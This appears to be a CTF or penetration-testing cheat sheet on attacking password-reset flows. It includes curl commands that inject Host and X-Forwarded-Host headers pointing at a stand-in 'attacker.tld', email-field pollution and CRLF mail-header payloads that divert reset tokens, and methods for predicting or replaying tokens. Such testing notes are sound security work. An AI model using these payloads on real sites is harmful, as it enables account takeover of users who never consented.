# Password reset — token prediction, host injection, flow abuse

The reset flow is a mini-auth protocol of its own: request a token →
receive a link → submit new password. Every stage is a bug surface.

---

## 1. The flow map

```
POST /forgot   {email}         → mints token, emails link
GET  /reset?token=T            → renders form (token in URL → Referer risk)
POST /reset    {token, new_pw} → verifies token, updates pw, should kill sessions
```

## 2. Token-generation bugs

| Bug | Signal | Test |
|---|---|---|
| sequential id | tokens differ by 1 | request two resets, diff |
| timestamp-based | token decodes to time | request two 1s apart |
| `md5(email)` / `sha1(email)` | same token for same email | re-request, compare |
| `md5(email+time)` | looks random, but time known | brute-force the second |
| `rand()`/`mt_rand()` seeded | PRNG | request N, feed tools/crypto |
| short token ≤6 digits | brute-force | ~10⁶ requests — bounded |
| token = hash of password | weird but seen | self-reset reveals it |
| token in `Set-Cookie` after POST | reset token set as cookie | check jar |
| token returned in response | no email needed | `{"reset_token":"..."}` |

```bash
# capture two reset tokens for the same account
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/forgot" --body '{"email":"a@t.tld"}' \
  --evidence-regex 'token=[A-Za-z0-9_-]{4,}' --evidence-kind class \
  --on-match confirms --on-miss refutes
```

## 3. Host-header injection — the classic

`POST /forgot` builds the reset link from `Host`/`X-Forwarded-Host`:

```bash
curl -s -X POST "$BASE/forgot" -H 'Host: attacker.tld' -d 'email=victim@t.tld'
curl -s -X POST "$BASE/forgot" -H 'X-Forwarded-Host: attacker.tld' -d 'email=victim@t.tld'
curl -s -X POST "$BASE/forgot" -H 'X-Forwarded-Host: attacker.tld' -H 'Host: target.tld' -d 'email=victim@t.tld'
```

The victim gets `https://attacker.tld/reset?token=REAL` — they click,
attacker harvests the token off the access log, resets the password.

Variants when `Host` is filtered:

```
X-Forwarded-Host, X-Host, X-Forwarded-Server, X-HTTP-Host-Override,
Forwarded: host=..., Forwarded: for=..;host=attacker.tld
```

## 4. Parameter pollution on the email field

```bash
email=victim@t.tld&email=attacker@t.tld       # last wins in most parsers
email=victim@t.tld,attacker@t.tld             # SMTP header / list
email=victim@t.tld%20attacker@t.tld           # space-joined list
email=victim@t.tld%0aCc:attacker@t.tld        # CRLF into mail headers
email=victim@t.tld%0d%0aBcc:attacker@t.tld
email[0]=victim@t.tld&email[1]=attacker@t.tld # array pollution
email=victim@t.tld&email=attacker@t.tld&_method=POST
{"email":["victim@t.tld","attacker@t.tld"]}   # JSON array
{"email":"victim@t.tld","email":"attacker@t.tld"}  # dup JSON key
```

Result wanted: token emailed to BOTH, or the mail to attacker but token
bound to victim.

## 5. Token-leakage paths

- `GET /reset?token=T` renders a page that loads third-party CSS/JS/
  analytics → `Referer: https://target/reset?token=T` leaks to the CDN.
  Check the page source for external `<script src>`, `<link>`, `<img>`.
- Token in a URL stored in browser history / synced.
- Token logged server-side (CTF: sometimes the *access log itself* is a
  readable endpoint).

## 6. Verification bugs on POST /reset

- Token checked for existence but **not bound to the account** — submit
  `{token: <yours>, email: <victim>}` with your own token.
- Token verified, then `email`/`user_id` in the same POST selects the row
  to update → swap it.
- Token not expired / single-use — replay it.
- Token accepted via **GET** `?token=&new_password=` where the method
  shouldn't mutate.
- The verify step is a **separate endpoint**; `POST /reset` trusts a
  client-side flag like `{"verified":true}`.

## 7. Post-reset session invalidation

After a successful reset, the app should kill all existing sessions.
Test: keep an authenticated session, run the reset, replay the old
session — if it still works, the old session survived the takeover.

## 8. Magic links

A magic link is a password reset that logs you in directly — everything
above applies, plus:

- The link itself is a bearer credential; if delivered over
  `http://` in the email, a network attacker wins.
- The link may be **single-use by URL** but the *session it mints* is
  replayable — capture the session it sets.

## 9. CTF shapes

- Token is `md5(username)` — compute it directly.
- Token is a JWT with a kid/jku/weak secret — `jwt-deep.md`.
- `/forgot` response contains the token (no email needed) — CTF
  convenience.
- Reset endpoint takes `user_id` param — swap it.
- Reset page source contains the token in a hidden field — check `View
  Source` on `/reset?token=`.
